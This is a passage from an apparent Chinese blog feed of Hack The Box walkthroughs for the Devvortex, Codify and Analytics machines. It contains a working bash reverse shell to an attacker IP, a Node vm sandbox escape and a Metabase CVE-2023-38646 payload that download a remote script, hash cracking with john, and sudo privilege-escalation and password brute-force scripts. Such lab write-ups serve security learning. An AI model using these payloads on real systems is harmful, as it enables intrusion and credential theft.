dbtype         mysqli</span><br><span class=\"line\"></span><br><span class=\"line\">[*] Scanned 1 of 1 hosts (100% complete)</span><br><span class=\"line\">[*] Auxiliary module execution completed</span><br></pre></td></tr></table></figure></p>\n<p>得到数据库账号和密码</p>\n<p>然后登录点击 system 然后在 templates 的第一个里面修改代码，index.php 只有读取权限写入不了那我们写 error.php 一样的</p>\n<p>写入</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">system(&#x27;bash -c &quot;bash -i &gt;&amp; /dev/tcp/10.10.14.54/9999 0&gt;&amp;1&quot;&#x27;);</span><br></pre></td></tr></table></figure></p>\n<p>然后</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nc -lvnp 9999</span><br></pre></td></tr></table></figure></p>\n<p>在根据这个路径进行访问即可得到 shell</p>\n<p>查看一下用户</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">root:x:0:0:root:/root:/bin/bash</span><br><span class=\"line\">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span><br><span class=\"line\">bin:x:2:2:bin:/bin:/usr/sbin/nologin</span><br><span class=\"line\">sys:x:3:3:sys:/dev:/usr/sbin/nologin</span><br><span class=\"line\">sync:x:4:65534:sync:/bin:/bin/sync</span><br><span class=\"line\">games:x:5:60:games:/usr/games:/usr/sbin/nologin</span><br><span class=\"line\">man:x:6:12:man:/var/cache/man:/usr/sbin/nologin</span><br><span class=\"line\">lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin</span><br><span class=\"line\">mail:x:8:8:mail:/var/mail:/usr/sbin/nologin</span><br><span class=\"line\">news:x:9:9:news:/var/spool/news:/usr/sbin/nologin</span><br><span class=\"line\">uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin</span><br><span class=\"line\">proxy:x:13:13:proxy:/bin:/usr/sbin/nologin</span><br><span class=\"line\">www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</span><br><span class=\"line\">backup:x:34:34:backup:/var/backups:/usr/sbin/nologin</span><br><span class=\"line\">list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin</span><br><span class=\"line\">irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin</span><br><span class=\"line\">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin</span><br><span class=\"line\">nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin</span><br><span class=\"line\">systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin</span><br><span class=\"line\">systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin</span><br><span class=\"line\">systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin</span><br><span class=\"line\">messagebus:x:103:106::/nonexistent:/usr/sbin/nologin</span><br><span class=\"line\">syslog:x:104:110::/home/syslog:/usr/sbin/nologin</span><br><span class=\"line\">_apt:x:105:65534::/nonexistent:/usr/sbin/nologin</span><br><span class=\"line\">tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false</span><br><span class=\"line\">uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin</span><br><span class=\"line\">tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin</span><br><span class=\"line\">landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin</span><br><span class=\"line\">pollinate:x:110:1::/var/cache/pollinate:/bin/false</span><br><span class=\"line\">sshd:x:111:65534::/run/sshd:/usr/sbin/nologin</span><br><span class=\"line\">systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin</span><br><span class=\"line\">lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false</span><br><span class=\"line\">usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin</span><br><span class=\"line\">fwupd-refresh:x:113:118:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin</span><br><span class=\"line\">mysql:x:114:119:MySQL Server,,,:/nonexistent:/bin/false</span><br><span class=\"line\">logan:x:1000:1000:,,,:/home/logan:/bin/bash</span><br><span class=\"line\">_laurel:x:997:997::/var/log/laurel:/bin/false</span><br></pre></td></tr></table></figure></p>\n<p>查看到有 /bin/bash 的用户有</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">root:x:0:0:root:/root:/bin/bash</span><br><span class=\"line\">logan:x:1000:1000:,,,:/home/logan:/bin/bash</span><br></pre></td></tr></table></figure></p>\n<p>现在我们的目标就是 logan</p>\n<p>然后通过一开始获得的账号密码登录 mysql</p>\n<p>在 select * from sd4fg_user 得到 logan 的密码串，然后通过 john 进行解密</p>\n<p>得到了 logan 密码</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">爆破出密码是tequieromucho</span><br></pre></td></tr></table></figure></p>\n<p>获取到 logan 的密码后登录</p>\n<p>提交 user.txt</p>\n<h4 id=\"提权\"><a class=\"anchor\" href=\"#提权\">#</a> 提权</h4>\n<p>然后 sudo -l</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">logan@devvortex:~$ sudo -l</span><br><span class=\"line\">Matching Defaults entries for logan on devvortex:</span><br><span class=\"line\">    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin</span><br><span class=\"line\"></span><br><span class=\"line\">User logan may run the following commands on devvortex:</span><br><span class=\"line\">    (ALL : ALL) /usr/bin/apport-cli</span><br></pre></td></tr></table></figure></p>\n<p>通过</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo /usr/bin/apport-cli -c test.log less</span><br><span class=\"line\">V</span><br><span class=\"line\">!/bin/bash</span><br></pre></td></tr></table></figure></p>\n<p>获取到 root 权限</p>\n",
            "tags": [
                "渗透"
            ]
        },
        {
            "id": "https://lookhui.github.io/HTB-Codify/",
            "url": "https://lookhui.github.io/HTB-Codify/",
            "title": "HTB-Codify",
            "date_published": "2023-12-14T06:52:58.000Z",
            "content_html": "<h1 id=\"codify\"><a class=\"anchor\" href=\"#codify\">#</a> Codify</h1>\n<h4 id=\"信息收集\"><a class=\"anchor\" href=\"#信息收集\">#</a> 信息收集</h4>\n<p>nmap 扫描 ip 并且浏览器访问 ip</p>\n<p>加上 hosts</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">10.10.11.239 codify.htb</span><br></pre></td></tr></table></figure></p>\n<p>nmap 扫描出打开了 3 个端口</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Starting Nmap 7.93 ( https://nmap.org ) at 2023-12-14 14:56 中国标准时间</span><br><span class=\"line\">Nmap scan report for codify.htb (10.10.11.239)</span><br><span class=\"line\">Host is up (0.33s latency).</span><br><span class=\"line\">Not shown: 997 closed tcp ports (reset)</span><br><span class=\"line\">PORT     STATE SERVICE</span><br><span class=\"line\">22/tcp   open  ssh</span><br><span class=\"line\">80/tcp   open  http</span><br><span class=\"line\">3000/tcp open  ppp</span><br><span class=\"line\"></span><br><span class=\"line\">Nmap done: 1 IP address (1 host up) scanned in 62.45 seconds</span><br></pre></td></tr></table></figure></p>\n<p>3000 和 80 都是一样的 web 界面我们直接在 js 上执行命令</p>\n<h4 id=\"反弹shell\"><a class=\"anchor\" href=\"#反弹shell\">#</a> 反弹 shell</h4>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">const vm = require(&#x27;vm&#x27;);</span><br><span class=\"line\">const script = `</span><br><span class=\"line\">const process = this.toString.constructor(&#x27;return process&#x27;)()</span><br><span class=\"line\">process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;curl -o /tmp/2.sh http://10.10.14.54/2.sh&#x27;).toString()</span><br><span class=\"line\">`;</span><br><span class=\"line\">const sandbox = &#123; m: 1, n: 2 &#125;;</span><br><span class=\"line\">const context = new vm.createContext(sandbox);</span><br><span class=\"line\">const res = vm.runInContext(script, context);</span><br><span class=\"line\">console.log(res)</span><br></pre></td></tr></table></figure></p>\n<p>我一开始想直接执行反弹 shell 但是失败现在下载试试</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">listening on [any] 9999 ...</span><br><span class=\"line\">connect to [10.10.14.54] from (UNKNOWN) [10.10.11.239] 56918</span><br><span class=\"line\">bash: cannot set terminal process group (1257): Inappropriate ioctl for device</span><br><span class=\"line\">bash: no job control in this shell</span><br><span class=\"line\">svc@codify:~$ ls</span><br><span class=\"line\">ls</span><br></pre></td></tr></table></figure></p>\n<p>成功反弹</p>\n<p>开始找第一个 flag</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">查看home文件下面的内容发现有两个文件</span><br><span class=\"line\">svc@codify:/home$ ls /home</span><br><span class=\"line\">ls /home</span><br><span class=\"line\">joshua</span><br><span class=\"line\">svc</span><br></pre></td></tr></table></figure></p>\n<p>可能 flag 就在这个 joshua 里面</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">svc@codify:/var/www/contact$ cat tickets.db</span><br><span class=\"line\">cat tickets.db</span><br><span class=\"line\">?T5??T?tableticketsticketsCREATE TABLE tickets (id INTEGER PRIMARY KEY AUTOINCREMENT, name TEXT, topic TEXT, description TEXT, status TEXT)P++Ytablesqlite_sequencesqlite_sequenceCREATE TABLE sqlite_sequence(name,seq)??tableusersusersCREATE TABLE users (</span><br><span class=\"line\">        id INTEGER PRIMARY KEY AUTOINCREMENT,</span><br><span class=\"line\">        username TEXT UNIQUE,</span><br><span class=\"line\">        password TEXT</span><br><span class=\"line\">??G?joshua$2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2</span><br><span class=\"line\">??</span><br><span class=\"line\">????ua  users</span><br><span class=\"line\">ickets</span><br><span class=\"line\">r]r乭%%?Joe WilliamsLocal setup?I use this site lot of the time. Is it possible to set this up locally? Like instead of coming to this site, can I download this and set it up in my own computer? A feature like that would be nice.open?;亀Tom HanksNeed networking modulesI think it would be better if you can implement a way to handle network-based stuff. Would help me out a lot. Thanks!open</span><br></pre></td></tr></table></figure></p>\n<p>在这个 var/www/contact 里面发现了 joshua 的信息</p>\n<p>还有他的密码串我们使用 john 来进行解码</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">└─$ john 1.txt</span><br><span class=\"line\">Using default input encoding: UTF-8</span><br><span class=\"line\">Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])</span><br><span class=\"line\">Cost 1 (iteration count) is 4096 for all loaded hashes</span><br><span class=\"line\">Will run 16 OpenMP threads</span><br><span class=\"line\">Proceeding with single, rules:Single</span><br><span class=\"line\">Press &#x27;q&#x27; or Ctrl-C to abort, almost any other key for status</span><br><span class=\"line\">Almost done: Processing the remaining buffered candidate passwords, if any.</span><br><span class=\"line\">Proceeding with wordlist:/usr/share/john/password.lst</span><br></pre></td></tr></table></figure></p>\n<p>解了 2 分钟就得到密码</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">└─$ john 1.txt</span><br><span class=\"line\">Using default input encoding: UTF-8</span><br><span class=\"line\">Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])</span><br><span class=\"line\">Cost 1 (iteration count) is 4096 for all loaded hashes</span><br><span class=\"line\">Will run 16 OpenMP threads</span><br><span class=\"line\">Proceeding with single, rules:Single</span><br><span class=\"line\">Press &#x27;q&#x27; or Ctrl-C to abort, almost any other key for status</span><br><span class=\"line\">Almost done: Processing the remaining buffered candidate passwords, if any.</span><br><span class=\"line\">Proceeding with wordlist:/usr/share/john/password.lst</span><br><span class=\"line\">spongebob1       (?)</span><br><span class=\"line\">1g 0:00:01:50 DONE 2/3 (2023-12-14 15:18) 0.009071g/s 108.4p/s 108.4c/s 108.4C/s steph1..gatita1</span><br><span class=\"line\">Use the &quot;--show&quot; option to display all of the cracked passwords reliably</span><br><span class=\"line\">Session completed.</span><br></pre></td></tr></table></figure></p>\n<p>使用 ssh 连接</p>\n<p>flag1 就在目录下</p>\n<h4 id=\"提权\"><a class=\"anchor\" href=\"#提权\">#</a> 提权</h4>\n<p>使用 sudo -l</p>\n<p>输入密码</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[sudo] password for joshua:</span><br><span class=\"line\">Matching Defaults entries for joshua on codify:</span><br><span class=\"line\">    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin,</span><br><span class=\"line\">    use_pty</span><br><span class=\"line\"></span><br><span class=\"line\">User joshua may run the following commands on codify:</span><br><span class=\"line\">    (root) /opt/scripts/mysql-backup.sh</span><br></pre></td></tr></table></figure></p>\n<p><span class=\"exturl\" data-url=\"aHR0cDovL3huLS1teXNxbC1iYWNrdXAtdnoweG40NWEuc2g=\">打开 mysql-backup.sh</span></p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#!/bin/bash</span><br><span class=\"line\">DB_USER=&quot;root&quot;</span><br><span class=\"line\">DB_PASS=$(/usr/bin/cat /root/.creds)</span><br><span class=\"line\">BACKUP_DIR=&quot;/var/backups/mysql&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">read -s -p &quot;Enter MySQL password for $DB_USER: &quot; USER_PASS</span><br><span class=\"line\">/usr/bin/echo</span><br><span class=\"line\"></span><br><span class=\"line\">if [[ $DB_PASS == $USER_PASS ]]; then</span><br><span class=\"line\">        /usr/bin/echo &quot;Password confirmed!&quot;</span><br><span class=\"line\">else</span><br><span class=\"line\">        /usr/bin/echo &quot;Password confirmation failed!&quot;</span><br><span class=\"line\">        exit 1</span><br><span class=\"line\">fi</span><br><span class=\"line\"></span><br><span class=\"line\">/usr/bin/mkdir -p &quot;$BACKUP_DIR&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">databases=$(/usr/bin/mysql -u &quot;$DB_USER&quot; -h 0.0.0.0 -P 3306 -p&quot;$DB_PASS&quot; -e &quot;SHOW DATABASES;&quot; | /usr/bin/grep -Ev &quot;(Database|information_schema|performance_schema)&quot;)</span><br><span class=\"line\"></span><br><span class=\"line\">for db in $databases; do</span><br><span class=\"line\">    /usr/bin/echo &quot;Backing up database: $db&quot;</span><br><span class=\"line\">    /usr/bin/mysqldump --force -u &quot;$DB_USER&quot; -h 0.0.0.0 -P 3306 -p&quot;$DB_PASS&quot; &quot;$db&quot; | /usr/bin/gzip &gt; &quot;$BACKUP_DIR/$db.sql.gz&quot;</span><br><span class=\"line\">done</span><br><span class=\"line\"></span><br><span class=\"line\">/usr/bin/echo &quot;All databases backed up successfully!&quot;</span><br><span class=\"line\">/usr/bin/echo &quot;Changing the permissions&quot;</span><br><span class=\"line\">/usr/bin/chown root:sys-adm &quot;$BACKUP_DIR&quot;</span><br><span class=\"line\">/usr/bin/chmod 774 -R &quot;$BACKUP_DIR&quot;</span><br><span class=\"line\">/usr/bin/echo &#x27;Done!&#x27;</span><br></pre></td></tr></table></figure></p>\n<p>这里的话使用脚本</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import subprocess</span><br><span class=\"line\">import string</span><br><span class=\"line\">def run_command(command):</span><br><span class=\"line\">    output = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE).stdout.decode()</span><br><span class=\"line\">    return output</span><br><span class=\"line\"></span><br><span class=\"line\">dic=string.ascii_letters+string.digits</span><br><span class=\"line\">password=&quot;&quot;</span><br><span class=\"line\">for i in range(100):</span><br><span class=\"line\">    for i in dic:</span><br><span class=\"line\">        output= run_command(f&#x27;echo &quot;&#123;password&#125;&#123;i&#125;*&quot; | sudo /opt/scripts/mysql-backup.sh&#x27;)</span><br><span class=\"line\">        if &quot;Password confirmed&quot; in output:</span><br><span class=\"line\">            password+=i</span><br><span class=\"line\">            print(password)</span><br><span class=\"line\">            break</span><br></pre></td></tr></table></figure></p>\n<p>得到 root 密码</p>\n<p>得到密码后不要使用 ssh 连接直接使用 su root 即可</p>\n",
            "tags": [
                "渗透"
            ]
        },
        {
            "id": "https://lookhui.github.io/HTB-Analytics/",
            "url": "https://lookhui.github.io/HTB-Analytics/",
            "title": "HTB-Analytics",
            "date_published": "2023-12-14T04:54:18.000Z",
            "content_html": "<h1 id=\"analytics\"><a class=\"anchor\" href=\"#analytics\">#</a> Analytics</h1>\n<h4 id=\"信息收集\"><a class=\"anchor\" href=\"#信息收集\">#</a> 信息收集</h4>\n<p>nmap 扫描同时 http 访问</p>\n<p>换上 hosts</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">10.10.11.233 analytical.htb</span><br></pre></td></tr></table></figure></p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Starting Nmap 7.93 ( https://nmap.org ) at 2023-12-14 12:55 中国标准时间</span><br><span class=\"line\">Nmap scan report for bogon (10.10.11.233)</span><br><span class=\"line\">Host is up (0.33s latency).</span><br><span class=\"line\">Not shown: 998 closed tcp ports (reset)</span><br><span class=\"line\">PORT   STATE SERVICE</span><br><span class=\"line\">22/tcp open  ssh</span><br><span class=\"line\">80/tcp open  http</span><br><span class=\"line\"></span><br><span class=\"line\">Nmap done: 1 IP address (1 host up) scanned in 50.99 seconds</span><br></pre></td></tr></table></figure></p>\n<p>hosts 换好后进行目录扫描</p>\n<p>查看主页面有一个登录 login 进去后发现域名是</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://data.analytical.htb/</span><br></pre></td></tr></table></figure></p>\n<p>把 hosts 添加上</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">10.10.11.233 data.analytical.htb</span><br></pre></td></tr></table></figure></p>\n<p>查看到 cookie 是 metabase 服务</p>\n<p>可以试试</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Metabase 远程代码执行漏洞(CVE-2023-38646)</span><br></pre></td></tr></table></figure></p>\n<h4 id=\"反弹shell\"><a class=\"anchor\" href=\"#反弹shell\">#</a> 反弹 shell</h4>\n<p>首先访问</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://data.analytical.htb/api/session/properties</span><br></pre></td></tr></table></figure></p>\n<p>得到 token</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&quot;setup-token&quot;: &quot;249fa03d-fd94-4d5b-b94f-b4ebf3df681f&quot;,</span><br></pre></td></tr></table></figure></p>\n<p>在访问</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://data.analytical.htb/api/setup/validate</span><br></pre></td></tr></table></figure></p>\n<p>构造 exp</p>\n<p>在本地执行 python -m http.server 80</p>\n<p><span class=\"exturl\" data-url=\"aHR0cDovL3huLS0yLXpuNmE5YjlkcjByNWl4ODBmLnNo\">并且写入一个 2.sh</span></p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">POST /api/setup/validate HTTP/1.1</span><br><span class=\"line\">Host: data.analytical.htb</span><br><span class=\"line\">Content-Type:application/json</span><br><span class=\"line\">Cache-Control: max-age=0</span><br><span class=\"line\">Upgrade-Insecure-Requests: 1</span><br><span class=\"line\">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36</span><br><span class=\"line\">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class=\"line\">Accept-Encoding: gzip, deflate</span><br><span class=\"line\">Accept-Language: zh-CN,zh;q=0.9</span><br><span class=\"line\">Cookie: metabase.DEVICE=17645f70-ae73-4c86-a81c-ab6fdaa2ccf7</span><br><span class=\"line\">Connection: close</span><br><span class=\"line\">Content-Length: 741</span><br><span class=\"line\"></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    &quot;token&quot;: &quot;249fa03d-fd94-4d5b-b94f-b4ebf3df681f&quot;,</span><br><span class=\"line\">    &quot;details&quot;:</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        &quot;is_on_demand&quot;: false,</span><br><span class=\"line\">        &quot;is_full_sync&quot;: false,</span><br><span class=\"line\">        &quot;is_sample&quot;: false,</span><br><span class=\"line\">        &quot;cache_ttl&quot;: null,</span><br><span class=\"line\">        &quot;refingerprint&quot;: false,</span><br><span class=\"line\">        &quot;auto_run_queries&quot;: true,</span><br><span class=\"line\">        &quot;schedules&quot;:</span><br><span class=\"line\">        &#123;&#125;,</span><br><span class=\"line\">        &quot;details&quot;:</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            &quot;db&quot;: &quot;zip:/app/metabase.jar!/sample-database.db;MODE=MSSQLServer;TRACE_LEVEL_SYSTEM_OUT=1\\\\;CREATE TRIGGER pwnshell BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\\njava.lang.Runtime.getRuntime().exec(&#x27;curl -o /tmp/2.sh http://10.10.14.54/2.sh&#x27;)\\n$$--=x&quot;,</span><br><span class=\"line\">            &quot;advanced-options&quot;: false,</span><br><span class=\"line\">            &quot;ssl&quot;: true</span><br><span class=\"line\">        &#125;,</span><br><span class=\"line\">        &quot;name&quot;: &quot;an-sec-research-team&quot;,</span><br><span class=\"line\">        &quot;engine&quot;: &quot;h2&quot;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>通过 curl 得到 2.sh 并且放在 tmp 文件夹下</p>\n<p>在使用</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span 